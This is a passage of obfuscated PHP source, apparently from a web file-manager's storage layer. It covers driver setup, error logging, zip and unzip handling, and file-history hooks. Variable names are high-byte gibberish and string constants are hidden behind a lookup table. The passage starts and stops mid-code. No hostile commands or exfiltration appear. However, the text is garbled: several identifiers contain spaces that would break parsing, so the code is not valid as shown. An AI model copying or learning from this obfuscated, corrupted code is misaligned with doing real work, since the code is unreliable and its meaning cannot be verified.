$ŠÒä¼Ôá[$¶¨Ï—¨ó[1263]]); $ŠÒä¼Ôá[$¶¨Ï—¨ó[564]] = $ÉåéÔ½Ì; $ŠÒä¼Ôá[$¶¨Ï—¨ó[1244]] = $Š˜½ï“™; $éˆÍï½ = array($¶¨Ï—¨ó[1265] => $¶¨Ï—¨ó[1272], $¶¨Ï—¨ó[6] => $ŠÒä¼Ôá); } else { $éˆÍï½[$¶¨Ï—¨ó[6]][$¶¨Ï—¨ó[1267]] = $·Œ•ŞÈ[$¶¨Ï—¨ó[194]]; } break; case KodIO::KOD_SHARE_ITEM: $éˆÍï½ = array($¶¨Ï—¨ó[1265] => $¶¨Ï—¨ó[1273], $¶¨Ï—¨ó[6] => $ŠÒä¼Ôá); $ÉåéÔ½Ì = Model($¶¨Ï—¨ó[671])->getInfo($ŠÒä¼Ôá[$¶¨Ï—¨ó[477]]); if ($ÉåéÔ½Ì[$¶¨Ï—¨ó[194]] == $¶¨Ï—¨ó[231]) { $Š˜½ï“™ = KodIO::clear($ÉåéÔ½Ì[$¶¨Ï—¨ó[1271]] . $ŠÒä¼Ôá[$¶¨Ï—¨ó[1263]]); $ŠÒä¼Ôá[$¶¨Ï—¨ó[564]] = $ÉåéÔ½Ì; $ŠÒä¼Ôá[$¶¨Ï—¨ó[1244]] = $Š˜½ï“™; $éˆÍï½ = array($¶¨Ï—¨ó[1265] => $¶¨Ï—¨ó[1274], $¶¨Ï—¨ó[6] => $ŠÒä¼Ôá); } else { if (!$Š˜½ï“™) { $Š˜½ï“™ = $ÉåéÔ½Ì[$¶¨Ï—¨ó[194]]; } $éˆÍï½[$¶¨Ï—¨ó[6]][$¶¨Ï—¨ó[1267]] = $ÉåéÔ½Ì[$¶¨Ï—¨ó[194]]; } break; default: $Š˜½ï“™ = $ŠÒä¼Ôá[$¶¨Ï—¨ó[87]]; $éˆÍï½ = array($¶¨Ï—¨ó[1265] => $¶¨Ï—¨ó[1275]); break; } $™Æø ô = $ŠÒä¼Ôá[$¶¨Ï—¨ó[87]]; if (!isset(self::$driverCache[$™Æø ô])) { $Ç½²’í = strtolower($éˆÍï½[$¶¨Ï—¨ó[98]]); $ÖÖáå†© = $GLOBALS[$¶¨Ï—¨ó[6]][$¶¨Ï—¨ó[92]][$¶¨Ï—¨ó[908]]; $‚ªé´¬Í = $¶¨Ï—¨ó[77] . (isset($ÖÖáå†©[$Ç½²’í]) ? $ÖÖáå†©[$Ç½²’í] : ucfirst($Ç½²’í)); if (!class_exists($‚ªé´¬Í)) { show_json("{$‚ªé´¬Í}\40\x6e\157\x74\x20\x65\x78\x69\163\x74\163\41", !1); } $» ”¾ËŸ = isset($éˆÍï½[$¶¨Ï—¨ó[6]]) ? $éˆÍï½[$¶¨Ï—¨ó[6]] : !1; self::$driverCache[$™Æø ô] = new $‚ªé´¬Í($» ”¾ËŸ); } $£ùãñæ = self::$driverCache[$™Æø ô]; $£ùãñæ->pathDriver = $œÑÊÔì; $£ùãñæ->pathBase = $¶¨Ï—¨ó[12]; if (isset($éˆÍï½[$¶¨Ï—¨ó[6]][$¶¨Ï—¨ó[1276]])) { $£ùãñæ->pathBase = rtrim($éˆÍï½[$¶¨Ï—¨ó[6]][$¶¨Ï—¨ó[1276]], $¶¨Ï—¨ó[8]) . $¶¨Ï—¨ó[8]; $Š˜½ï“™ = $£ùãñæ->pathBase . ltrim($Š˜½ï“™, $¶¨Ï—¨ó[8]); } $Š˜½ï“™ = $£ùãñæ->getPath($Š˜½ï“™); if (isset($ŠÒä¼Ôá[$¶¨Ï—¨ó[1244]])) { $Š˜½ï“™ = $ŠÒä¼Ôá[$¶¨Ï—¨ó[1244]]; } $£ùãñæ->path = $Š˜½ï“™; return $£ùãñæ; } public static function errorTips($ãÒ›¾²„ = false) { $ß™õøó =& $_SERVER[ıÚ˜š²İ]; static $à×å§« = array(); $çŒÖ« = 1000; if ($ãÒ›¾²„ === -1) { return $à×å§« ? $à×å§«[count($à×å§«) - 1] : $ß™õøó[12]; } if ($ãÒ›¾²„ === !1) { return implode($ß™õøó[288], $à×å§«); } if (count($à×å§«) >= $çŒÖ«) { $à×å§« = array_slice($à×å§«, $çŒÖ« * 0.5, $çŒÖ«); } $à×å§«[] = $ãÒ›¾²„; write_log($ß™õøó[176] . ACTION . $ß™õøó[1277] . $ãÒ›¾²„, $ß™õøó[1278]); } public static function getLastError($¡£ñ€šÚ = '') { $°ŒÚ©Ûï = self::errorTips(-1); return $°ŒÚ©Ûï ? $°ŒÚ©Ûï : $¡£ñ€šÚ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $İì­ãš; if ($İì­ãš) { return $İì­ãš; } $¥ƒ§š”ë = IO::init($_SERVER[ıÚ˜š²İ][8]); return $¥ƒ§š”ë; } private static function iconvSystem($¹¹¼¼¶Ò) { return self::local()->iconvSystem($¹¹¼¼¶Ò); } private static function iconvApp($¼ï¼) { return self::local()->iconvApp($¼ï¼); } public static function zipFolder($éèË­‹ò, $ƒİ¤ı‹· = "\x7a\x69\x70", $¯ÒÙíËˆ = '', $Ÿç»Î» = REPEAT_RENAME) { $ğÏèÇû =& $_SERVER[ıÚ˜š²İ]; $ÓÅÛíâÓ = IO::listPath($éèË­‹ò); if (!$ÓÅÛíâÓ) { return !1; } $ÓÅÛíâÓ = array_merge($ÓÅÛíâÓ[$ğÏèÇû[85]], $ÓÅÛíâÓ[$ğÏèÇû[86]]); return self::zip($ÓÅÛíâÓ, $ƒİ¤ı‹·, $¯ÒÙíËˆ, $Ÿç»Î»); } public static function zip($«…Äü¦ƒ, $ÉíÆ¥×ª = "\x7a\151\x70", $©çı¿¿Ó = '', $İéĞôİ = REPEAT_RENAME) { $á‡ïØİ­ =& $_SERVER[ıÚ˜š²İ]; if (is_string($«…Äü¦ƒ) && $«…Äü¦ƒ) { $«…Äü¦ƒ = array(array($á‡ïØİ­[87] => $«…Äü¦ƒ)); } $Æ·ÀÑíÏ = self::init($«…Äü¦ƒ[0][$á‡ïØİ­[87]]); $ä§³ÔÙ = self::info($«…Äü¦ƒ[0][$á‡ïØİ­[87]]); $äò¾‰ï = $á‡ïØİ­[12]; $Š­Î° = $á‡ïØİ­[12]; $‚íô¤§İ = $á‡ïØİ­[12]; if ($©çı¿¿Ó && substr($©çı¿¿Ó, -1, 1) != $á‡ïØİ­[8]) { $Š­Î° = get_path_father($©çı¿¿Ó); $‚íô¤§İ = get_path_this($©çı¿¿Ó); } else { $Š­Î° = self::pathFather($ä§³ÔÙ[$á‡ïØİ­[87]]); $‚íô¤§İ = $ä§³ÔÙ[$á‡ïØİ­[32]] . $á‡ïØİ­[10] . $ÉíÆ¥×ª; if (count($«…Äü¦ƒ) > 1) { $©ÅŸÖ¨í = IO::info($Š­Î°); $‚íô¤§İ = $©ÅŸÖ¨í[$á‡ïØİ­[32]] . $á‡ïØİ­[10] . $ÉíÆ¥×ª; } if ($©çı¿¿Ó) { $Š­Î° = $©çı¿¿Ó; } } if ($Æ·ÀÑíÏ->getType() == $á‡ïØİ­[109]) { $Ê ˜ùé = self::init($Š­Î°); $¦¹î¬»ª = $Ê ˜ùé->getType() == $á‡ïØİ­[109] ? $Š­Î° : get_path_father($Æ·ÀÑíÏ->path); $¦¹î¬»ª = IO::getPathInner($¦¹î¬»ª); $¦¹î¬»ª = rtrim($¦¹î¬»ª, $á‡ïØİ­[8]) . $á‡ïØİ­[8]; mk_dir($¦¹î¬»ª); } else { $äò¾‰ï = TEMP_FILES . $á‡ïØİ­[1279] . time() . rand_string(8) . $á‡ïØİ­[8]; mk_dir($äò¾‰ï); file_put_contents($äò¾‰ï . $á‡ïØİ­[1280], $á‡ïØİ­[12]); $¦¹î¬»ª = $äò¾‰ï; } $ÌÉ’ÇÔ = IO::info($¦¹î¬»ª); if (!$ÌÉ’ÇÔ || !$ÌÉ’ÇÔ[$á‡ïØİ­[236]]) { show_json(LNG($á‡ïØİ­[1281]), !1); } $À”½ æµ = self::zipFileList($«…Äü¦ƒ, $äò¾‰ï); foreach ($À”½ æµ as $şåÅÑ÷ => $…ôÄÚúÇ) { $À”½ æµ[$şåÅÑ÷] = self::iconvSystem($…ôÄÚúÇ); } $²’°Ø¸ = get_filename_auto($¦¹î¬»ª . $‚íô¤§İ, $á‡ïØİ­[12], $İéĞôİ); KodArchive::create(self::iconvSystem($²’°Ø¸), $À”½ æµ); if (!IO::exist($²’°Ø¸)) { if ($äò¾‰ï) { del_dir($äò¾‰ï); } write_log($á‡ïØİ­[1282] . $²’°Ø¸, $á‡ïØİ­[390]); show_json(LNG($á‡ïØİ­[1283]), !1); } if (!$äò¾‰ï) { return $²’°Ø¸; } $à÷ÓÔ„ = self::move($²’°Ø¸, $Š­Î°, $İéĞôİ); if ($äò¾‰ï) { del_dir($äò¾‰ï); } if (!$²’°Ø¸) { write_log($á‡ïØİ­[1284] . $²’°Ø¸ . $á‡ïØİ­[1285] . $Š­Î°, $á‡ïØİ­[390]); show_json(LNG($á‡ïØİ­[1283]), !1); } return $à÷ÓÔ„; } public static function unzip($ê“¢ÍØß, $ÓÁ­éÍ×, $‘‘íÕ˜ = "\x2d\61", $¿÷™ú°è = "\162\145\160\x6c\x61\143\x65") { $×õ‹Î¨§ =& $_SERVER[ıÚ˜š²İ]; $¿æÜµ¬± = parent::info($ê“¢ÍØß); if (!$¿æÜµ¬±) { show_json(LNG($×õ‹Î¨§[1286]), !1); } $œéåÕíÁ = IO::infoFullSimple($ÓÁ­éÍ×); if (!$œéåÕíÁ) { $ÓÁ­éÍ× = IO::mkdir($ÓÁ­éÍ×); } if (isset($œéåÕíÁ[$×õ‹Î¨§[194]]) && trim($œéåÕíÁ[$×õ‹Î¨§[87]], $×õ‹Î¨§[8]) != trim($ÓÁ­éÍ×, $×õ‹Î¨§[8])) { $à‰õöÙÀ = KodIO::make($œéåÕíÁ[$×õ‹Î¨§[193]]); $œêÙ¯¾Å = IO::fileNameAuto($à‰õöÙÀ, $œéåÕíÁ[$×õ‹Î¨§[32]], REPEAT_RENAME_FOLDER, !0); $ÓÁ­éÍ× = IO::mkdir($à‰õöÙÀ . $œêÙ¯¾Å); } $‘‘íÕ˜ = $‘‘íÕ˜ && $‘‘íÕ˜ != $×õ‹Î¨§[1287] ? @json_decode($‘‘íÕ˜, !0) : -1; $ŞÕ¹— = self::unzipPart($ê“¢ÍØß, $‘‘íÕ˜); if (!$ŞÕ¹— || !IO::exist($ŞÕ¹—[$×õ‹Î¨§[233]])) { show_json(LNG($×õ‹Î¨§[108]), !1); } $à‘˜û‚‘ = $ŞÕ¹—[$×õ‹Î¨§[1288]][count($ŞÕ¹—[$×õ‹Î¨§[1288]]) - 1]; if ($à‘˜û‚‘[$×õ‹Î¨§[1289]] == -1 || substr($à‘˜û‚‘[$×õ‹Î¨§[32]], -1, 1) == $×õ‹Î¨§[8]) { $«”äªŒ¯ = $ŞÕ¹—[$×õ‹Î¨§[1290]] . rand_string(10) . $×õ‹Î¨§[8]; mk_dir($«”äªŒ¯); $†ğîÆŸ÷ = count($ŞÕ¹—[$×õ‹Î¨§[1288]]) == 1 ? IO::ext($ê“¢ÍØß) : get_path_ext($ŞÕ¹—[$×õ‹Î¨§[233]]); $ŠÓ¤®¤Œ = KodArchive::extract(self::iconvSystem($ŞÕ¹—[$×õ‹Î¨§[233]]), $«”äªŒ¯, $à‘˜û‚‘[$×õ‹Î¨§[1289]], $œêÙ¯¾Å, $†ğîÆŸ÷); self::unzipErrorCheck($ŠÓ¤®¤Œ, array($×õ‹Î¨§[1291], $ê“¢ÍØß, $†ğîÆŸ÷, $ÓÁ­éÍ×, $ŞÕ¹—)); Hook::trigger($×õ‹Î¨§[1292], $«”äªŒ¯); recursion_dir($«”äªŒ¯, $¢ó§ÁÉ€, $Áöî ¸°, 0); $¥ó£Äæá = array_merge($¢ó§ÁÉ€, $Áöî ¸°); $£¢÷îÙ» = array(); foreach ($¥ó£Äæá as $†É¨Ó–ô) { $›¹•Â¨ˆ = IO::move(self::iconvApp($†É¨Ó–ô), $ÓÁ­éÍ×, $¿÷™ú°è); if ($›¹•Â¨ˆ) { $£¢÷îÙ»[] = $›¹•Â¨ˆ; } } del_dir($«”äªŒ¯); } else { $›¹•Â¨ˆ = IO::move($ŞÕ¹—[$×õ‹Î¨§[233]], $ÓÁ­éÍ×, $¿÷™ú°è, get_path_this($à‘˜û‚‘[$×õ‹Î¨§[32]])); if ($›¹•Â¨ˆ) { $£¢÷îÙ»[] = $›¹•Â¨ˆ; } } return $£¢÷îÙ» ? $£¢÷îÙ» : !1; } public static function unzipList($¹è©­Ú) { $şÌÏâÃ™ =& $_SERVER[ıÚ˜š²İ]; $–„®Ÿ = isset($¹è©­Ú[$şÌÏâÃ™[1293]]) ? $¹è©­Ú[$şÌÏâÃ™[1293]] : !1; $é÷ÑÑ = isset($¹è©­Ú[$şÌÏâÃ™[1289]]) ? @json_decode($¹è©­Ú[$şÌÏâÃ™[1289]], !0) : -1; $øİùœ = self::unzipPart($¹è©­Ú[$şÌÏâÃ™[87]], $é÷ÑÑ); if (!$øİùœ || !IO::exist($øİùœ[$şÌÏâÃ™[233]])) { show_json(LNG($şÌÏâÃ™[108]), !1); } $Ë”é¤º± = $øİùœ[$şÌÏâÃ™[1288]][count($øİùœ[$şÌÏâÃ™[1288]]) - 1]; $Ü²”ãˆ· = in_array(IO::ext($øİùœ[$şÌÏâÃ™[233]]), array($şÌÏâÃ™[390], $şÌÏâÃ™[1294], $şÌÏâÃ™[1295], $şÌÏâÃ™[1296], $şÌÏâÃ™[1297], $şÌÏâÃ™[1298])); if (!$–„®Ÿ && ($Ë”é¤º±[$şÌÏâÃ™[1289]] == -1 || $Ü²”ãˆ·)) { $úœÑƒ¤ˆ = $øİùœ[$şÌÏâÃ™[1290]] . get_path_this($øİùœ[$şÌÏâÃ™[233]]) . $şÌÏâÃ™[1299]; if (!IO::exist($úœÑƒ¤ˆ)) { $Œ”Àµ¯ß = $Ë”é¤º±[$şÌÏâÃ™[1289]] == -1 ? get_path_ext(IO::pathThis($¹è©­Ú[$şÌÏâÃ™[87]])) : get_path_ext($øİùœ[$şÌÏâÃ™[233]]); $“œ„šç = KodArchive::listContent(self::iconvSystem($øİùœ[$şÌÏâÃ™[233]]), !0, $Œ”Àµ¯ß); self::unzipErrorCheck($“œ„šç, array($şÌÏâÃ™[1300], $¹è©­Ú, $øİùœ)); @file_put_contents($úœÑƒ¤ˆ, json_encode($“œ„šç[$şÌÏâÃ™[1301]])); } return @json_decode(IO::getContent($úœÑƒ¤ˆ), !0); } IO::fileOut($øİùœ[$şÌÏâÃ™[233]], $–„®Ÿ, get_path_this($Ë”é¤º±[$şÌÏâÃ™[32]])); die; } private static function zipFileList($Ö•æ²˜â, $ëƒ•ªš¬ = false) { $¢õËñä¸ =& $_SERVER[ıÚ˜š²İ]; $»¢€äÍ = array(); foreach ($Ö•æ²˜â as $Ñá™š‘í) { $´ï©‚ÍÆ = $Ñá™š‘í[$¢õËñä¸[87]]; if ($ëƒ•ªš¬) { $´ï©‚ÍÆ = self::copy($Ñá™š‘í[$¢õËñä¸[87]], $ëƒ•ªš¬, $¢õËñä¸[901]); } else { $ğ½¢‰š = self::init($Ñá™š‘í[$¢õËñä¸[87]]); if ($ğ½¢‰š->getType() == $¢õËñä¸[109]) { $´ï©‚ÍÆ = $ğ½¢‰š->path; } } if ($´ï©‚ÍÆ && self::local()->exist($´ï©‚ÍÆ)) { $»¢€äÍ[$Ñá™š‘í[$¢õËñä¸[87]]] = $´ï©‚ÍÆ; } } if (!empty($»¢€äÍ)) { return array_values($»¢€äÍ); } show_json(LNG($¢õËñä¸[1258]), !1); } private static function localFilePath($È†¥Ğª) { $÷İ×»¬– =& $_SERVER[ıÚ˜š²İ]; $ºÚÅõäş = KodIO::parse($È†¥Ğª); if ($ºÚÅõäş[$÷İ×»¬–[33]] == KodIO::KOD_SOURCE) { $óøôÃ£Ù = Model($÷İ×»¬–[907])->fileInfoGet(KodIO::sourceID($È†¥Ğª)); if (!$óøôÃ£Ù[$÷İ×»¬–[87]]) { show_json($÷İ×»¬–[1302], !1); } $È†¥Ğª = $óøôÃ£Ù[$÷İ×»¬–[87]]; } $¡£ºŒËå = self::init($È†¥Ğª); if ($¡£ºŒËå->pathParse[$÷İ×»¬–[1244]]) { $È†¥Ğª = $¡£ºŒËå->pathParse[$÷İ×»¬–[1244]]; $¡£ºŒËå = self::init($È†¥Ğª); } $Öõä±¡¦ = $¡£ºŒËå->getType(); if ($Öõä±¡¦ == $÷İ×»¬–[109] || $Öõä±¡¦ == $÷İ×»¬–[1303]) { if (!$¡£ºŒËå->exist($¡£ºŒËå->path)) { show_json(LNG($÷İ×»¬–[108]), !1); } return $¡£ºŒËå->path; } return !1; } public static function unzipPart($†å¥œŠÀ, $î‰ÅáÇî = -1) { $Á†±šî¾ =& $_SERVER[ıÚ˜š²İ]; $ååş×ßÍ = IO::pathThis($†å¥œŠÀ); if (!$î‰ÅáÇî || $î‰ÅáÇî == -1) { $‡ç±Å½ª = array(array($Á†±šî¾[32] => $ååş×ßÍ, $Á†±šî¾[1289] => -1)); $‡ç±Å½ª[0][$Á†±šî¾[1304]] = $‡ç±Å½ª[0][$Á†±šî¾[32]]; } else { if (is_array($î‰ÅáÇî)) { $‡ç±Å½ª = $î‰ÅáÇî; $ååÆƒ»¡ = count($‡ç±Å½ª) - 1; for ($ü‚Š†âç = 0; $ü‚Š†âç <= $ååÆƒ»¡; $ü‚Š†âç++) { $ÒùáÌşİ = $‡ç±Å½ª[$ü‚Š†âç]; $¯„öÔúÏ = get_path_this($ÒùáÌşİ[$Á†±šî¾[32]]) . (checkExtSafe($ÒùáÌşİ[$Á†±šî¾[32]]) ? $Á†±šî¾[12] : $Á†±šî¾[1305]); $‡ç±Å½ª[$ü‚Š†âç][$Á†±šî¾[1304]] = $Á†±šî¾[1306] . intval($ÒùáÌşİ[$Á†±šî¾[1289]]) . $Á†±šî¾[464] . $¯„öÔúÏ; if ($ü‚Š†âç == 0) { continue; } $‡ç±Å½ª[$ü‚Š†âç][$Á†±šî¾[1304]] = $‡ç±Å½ª[$ü‚Š†âç - 1][$Á†±šî¾[1304]] . $Á†±šî¾[1307] . $‡ç±Å½ª[$ü‚Š†âç][$Á†±šî¾[1304]]; } } } if (!is_array($‡ç±Å½ª) || count($‡ç±Å½ª) == 0) { return !1; } $•¦ú™®ß = $‡ç±Å½ª[count($‡ç±Å½ª) - 1]; if (!IO::exist($†å¥œŠÀ)) { return !1; } $ç¦ÍÃşÊ = TEMP_FILES . $Á†±šî¾[1308] . kodIO::hashPathSafe($†å¥œŠÀ) . $Á†±šî¾[8]; $À”¼ÏúÆ = $ç¦ÍÃşÊ . $•¦ú™®ß[$Á†±šî¾[1304]]; mk_dir($ç¦ÍÃşÊ); file_put_contents(TEMP_FILES . $Á†±šî¾[1280], $Á†±šî¾[12]); if (IO::exist($À”¼ÏúÆ)) { return array($Á†±šî¾[233] => $À”¼ÏúÆ, $Á†±šî¾[1288] => $‡ç±Å½ª, $Á†±šî¾[1290] => $ç¦ÍÃşÊ); } $ñ˜†Ş„ = self::localFilePath($†å¥œŠÀ); if (!$ñ˜†Ş„) { $ñ˜†Ş„ = $ç¦ÍÃşÊ . $Á†±šî¾[1309]; if (!IO::exist($ñ˜†Ş„)) { self::copy($†å¥œŠÀ, $ç¦ÍÃşÊ, !1, get_path_this($ñ˜†Ş„)); } } if (!$ñ˜†Ş„ || !IO::exist($ñ˜†Ş„)) { return !1; } if ($•¦ú™®ß[$Á†±šî¾[1289]] == -1) { return array($Á†±šî¾[233] => $ñ˜†Ş„, $Á†±šî¾[1288] => $‡ç±Å½ª, $Á†±šî¾[1290] => $ç¦ÍÃşÊ); } $’õç§Â¶ = $ñ˜†Ş„; foreach ($‡ç±Å½ª as $ü‚Š†âç => $ÒùáÌşİ) { if (!$ÒùáÌşİ || $ÒùáÌşİ[$Á†±šî¾[1289]] == $Á†±šî¾[1287]) { break; } if (substr($ÒùáÌşİ[$Á†±šî¾[32]], -1, 1) == $Á†±šî¾[8]) { break; } $àìİŸˆ = in_array(get_path_ext($ÒùáÌşİ[$Á†±šî¾[1304]]), array($Á†±šî¾[390], $Á†±šî¾[1294], $Á†±šî¾[1295], $Á†±šî¾[1296], $Á†±šî¾[1297], $Á†±šî¾[1298])); $šî“ŠÈ = $ü‚Š†âç == count($‡ç±Å½ª) - 1 && $àìİŸˆ; $¾Ä©™¤ê = $ç¦ÍÃşÊ . $ÒùáÌşİ[$Á†±šî¾[1304]]; $âÍõÏ = $ç¦ÍÃşÊ . get_path_this($ÒùáÌşİ[$Á†±šî¾[32]]); if (IO::exist($¾Ä©™¤ê)) { $’õç§Â¶ = $¾Ä©™¤ê; continue; } $óİ´í© = $ü‚Š†âç == 0 ? get_path_ext($ååş×ßÍ) : get_path_ext($’õç§Â¶); $ÄÓøûÛ = KodArchive::extract(self::iconvSystem($’õç§Â¶), $ç¦ÍÃşÊ, $ÒùáÌşİ[$Á†±šî¾[1289]], $ìƒôùèÄ, $óİ´í©); self::unzipErrorCheck($ÄÓøûÛ, array($Á†±šî¾[1310], $†å¥œŠÀ, $‡ç±Å½ª, $ÒùáÌşİ, $¾Ä©™¤ê)); if (IO::exist($âÍõÏ)) { IO::rename($âÍõÏ, get_path_this($¾Ä©™¤ê)); } $’õç§Â¶ = $¾Ä©™¤ê; } $À”¼ÏúÆ = $’õç§Â¶; return array($Á†±šî¾[233] => $’õç§Â¶, $Á†±šî¾[1288] => $‡ç±Å½ª, $Á†±šî¾[1290] => $ç¦ÍÃşÊ); } private static function unzipErrorCheck($ê¨¾·ƒË, $®€•€•´ = false) { $”÷üÇ–› =& $_SERVER[ıÚ˜š²İ]; if ($ê¨¾·ƒË[$”÷üÇ–›[1311]]) { return !0; } write_log(array($”÷üÇ–›[1312], $ê¨¾·ƒË, $®€•€•´), $”÷üÇ–›[1313]); $‡÷£Û½é = is_array($ê¨¾·ƒË[$”÷üÇ–›[1301]]) ? json_encode($ê¨¾·ƒË[$”÷üÇ–›[1301]]) : $ê¨¾·ƒË[$”÷üÇ–›[1301]]; show_json($”÷üÇ–›[1314] . $‡÷£Û½é, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Åû„»½ =& $_SERVER[ıÚ˜š²İ]; $«„¿Š‘ú = $GLOBALS[$Åû„»½[6]][$Åû„»½[92]]; if ($«„¿Š‘ú[$Åû„»½[1315]] != 1) { return; } if ($«„¿Š‘ú[$Åû„»½[1316]] <= 0) { return; } if (isset($_REQUEST[$Åû„»½[1317]]) && $_REQUEST[$Åû„»½[1317]] == $Åû„»½[91]) { return; } Hook::bind($Åû„»½[1318], $Åû„»½[1319]); Hook::bind($Åû„»½[1320], $Åû„»½[1321]); Hook::bind($Åû„»½[1322], $Åû„»½[1323]); Hook::bind($Åû„»½[1324], $Åû„»½[1325]); Hook::bind($Åû„»½[1326], $Åû„»½[1327]); Hook::bind($Åû„»½[1328], $Åû„»½[1329]); } public static function eventBeforeUpload($¯ÔÁŒÊ) { if ($¯ÔÁŒÊ[3] && $¯ÔÁŒÊ[3] != REPEAT_REPLACE) { return; } $ê˜„ÌØ° = self::parsePath($¯ÔÁŒÊ[0]); if (!$ê˜„ÌØ°) { return; } self::add($ê˜„ÌØ°); } public static function eventBeforeEdit($ĞÕÛíÚ‘) { $ô°ŞØÂÖ = self::parsePath($ĞÕÛíÚ‘[0]); if (!$ô°ŞØÂÖ) { return; } self::add($ô°ŞØÂÖ); } public static function eventBeforeCopyFile($ä“äàœ, $Ö®şŞ‹×, $¯ÛÇÌåä, $¿€ñÔ¼Ç, $ªø„¹è÷, $ìÈÈö²®) { $§ °å–– =& $_SERVER[ıÚ˜š²İ]; if (isset($¯ÛÇÌåä->_data[$§ °å––[1248]]) && $¯ÛÇÌåä->_data[$§ °å––[1248]]) { return; } $¥·Ûå¹ô = $¯ÛÇÌåä->getPathOuter($¿€ñÔ¼Ç); $†Åì÷›¤ = self::parsePath($¥·Ûå¹ô); if (!$†Åì÷›¤) { return; } self::add($†Åì÷›¤); } public static function eventBeforeRename($êè×ßıä) { $õòıüÀ =& $_SERVER[ıÚ˜š²İ]; $åÔòùôª = self::parsePath($êè×ßıä[0]); if (!$åÔòùôª) { return; } $‘ÜúÛå§ = self::checkInHistory($åÔòùôª); if (!$‘ÜúÛå§) { return; } if ($‘ÜúÛå§[$õòıüÀ[33]] == $õòıüÀ[233]) { $¤®åÑ‡ = self::listData($åÔòùôª); if ($¤®åÑ‡ && $¤®åÑ‡[$õòıüÀ[447]]) { self::moveHistory($åÔòùôª, $êè×ßıä[1]); } } else { IO::rename($‘ÜúÛå§[$õòıüÀ[87]], $êè×ßıä[1]); } } public static function eventBeforeMove($«Éö¥´) { $«µ€”òâ =& $_SERVER[ıÚ˜š²İ]; $¤ß¿¬Íì = self::parsePath($«Éö¥´[0]); if (!$¤ß¿¬Íì) { return; } $Û«Ôú×¤ = self::parsePath($«Éö¥´[1]); if (!$Û«Ôú×¤) { return; } $ˆ§Âô”Š = $«Éö¥´[3]; $õÈû“Ø„ = self::checkInHistory($¤ß¿¬Íì); if (!$õÈû“Ø„) { return; } $¡×ˆ§Ô = self::pathHistory($Û«Ôú×¤); if ($õÈû“Ø„[$«µ€”òâ[33]] == $«µ€”òâ[233]) { $«”ÎÚÇ© = self::listData($¤ß¿¬Íì); $Ö€ë—¿³ = rtrim($Û«Ôú×¤, $«µ€”òâ[8]) . $«µ€”òâ[8] . ($ˆ§Âô”Š ? $ˆ§Âô”Š : get_path_this($¤ß¿¬Íì)); $ôıª¤Ëú = self::listData($Ö€ë—¿³); if ($«”ÎÚÇ© && $«”ÎÚÇ©[$«µ€”òâ[447]] && $ôıª¤Ëú && $ôıª¤Ëú[$«µ€”òâ[447]]) { return self::clear($¤ß¿¬Íì); } if ($«”ÎÚÇ© && $«”ÎÚÇ©[$«µ€”òâ[447]]) { self::moveHistory($¤ß¿¬Íì, $ˆ§Âô”Š, $¡×ˆ§Ô); } } else { IO::move($õÈû“Ø„[$«µ€”òâ[87]], $¡×ˆ§Ô, !1, $ˆ§Âô”Š); self::clearEmptyFolder(IO::pathFather($õÈû“Ø„[$«µ€”òâ[87]])); } } public static function eventAfterRemove($ŞÚŸù†Æ, $¼öëŞï) { $áò¶À¦Ğ =& $_SERVER[ıÚ˜š²İ]; if (!$¼öëŞï) { return; } $´ÀÄÀ¿Ğ = self::parsePath($ŞÚŸù†Æ[0]); if (!$´ÀÄÀ¿Ğ) { return; } $¦ĞˆÈ†¦ = self::checkInHistory($´ÀÄÀ¿Ğ); if (!$¦ĞˆÈ†¦) { return; } if ($¦ĞˆÈ†¦[$áò¶À¦Ğ[33]] == $áò¶À¦Ğ[233]) { $€Ü©Ù¯Å = self::listData($´ÀÄÀ¿Ğ, !1); if ($€Ü©Ù¯Å && $€Ü©Ù¯Å[$áò¶À¦Ğ[447]]) { self::clear($´ÀÄÀ¿Ğ, !1); } } else { IO::remove($¦ĞˆÈ†¦[$áò¶À¦Ğ[87]]); self::clearEmptyFolder(IO::pathFather($¦ĞˆÈ†¦[$áò¶À¦Ğ[87]])); } } private static function checkInHistory($¦²ê©ñ—) { $ê…‡‹Êñ = self::pathHistory($¦²ê©ñ—); if (!IO::exist($ê…‡‹Êñ)) { $ê…‡‹Êñ .= $_SERVER[ıÚ˜š²İ][1330]; } return IO::exist($ê…‡‹Êñ) ? IO::info($ê…‡‹Êñ) : !1; } private static function parsePath($ÁÑØéö) { $çËÉ¥„ =& $_SERVER[ıÚ˜š²İ]; if (!$ÁÑØéö) { return !1; } if (isset($GLOBALS[$çËÉ¥„[1331]]) && $GLOBALS[$çËÉ¥„[1331]]) { return; } $÷ƒı—¸À = KodIO::parse($ÁÑØéö); $Œ¹âõıÈ = $÷ƒı—¸À[$çËÉ¥„[33]]; $À·áµÜ— = !$Œ¹âõıÈ || $Œ¹âõıÈ == KodIO::KOD_IO || $Œ¹âõıÈ == KodIO::KOD_SHARE_ITEM; if (!$À·áµÜ— || !$÷ƒı—¸À[$çËÉ¥„[1332]]) { return !1; } if (substr($ÁÑØéö, 0, strlen(DATA_PATH . $çËÉ¥„[1333])) == DATA_PATH . $çËÉ¥„[1333]) { return !1; } if ($Œ¹âõıÈ == KodIO::KOD_SHARE_ITEM) { $ƒñğóãŒ = IO::init($ÁÑØéö); if ($ƒñğóãŒ->pathParse[$çËÉ¥„[1244]]) { return self::parsePath($ƒñğóãŒ->pathParse[$çËÉ¥„[1244]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¾çÆõÃ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $çËÉ¥„[1334]); foreach ($¾çÆõÃ as $Ó†’¢¬•) { if (!$Œ¹âõıÈ && substr($ÁÑØéö, 0, strlen($Ó†’¢¬•)) == $Ó†’¢¬•) { return !1; } } self::log($GLOBALS[$çËÉ¥„[1239]] . $çËÉ¥„[1335] . $ÁÑØéö); return $ÁÑØéö; } private static function pathHistory($¬Ş‚°åº) { $Öáñç± =& $_SERVER[ıÚ˜š²İ]; $Ù„¸¹Ÿ† = self::$_historyBase . ltrim(KodIO::clear($¬Ş‚°åº), $Öáñç±[8]); $Ù„¸¹Ÿ† = str_replace(array($Öáñç±[1336]), array($Öáñç±[1337]), $Ù„¸¹Ÿ†); return $Ù„¸¹Ÿ†; } public static function log($Ê“»ß—Ú) { } public static function historyCount($ö¯ÄĞŠ¡) { $Öß—âŠ =& $_SERVER[ıÚ˜š²İ]; $ü»¢£òŞ = array(); $ÈÑúÃ´ = array(); foreach ($ö¯ÄĞŠ¡ as $ÛÕÉ) { $÷ëºŸßƒ = 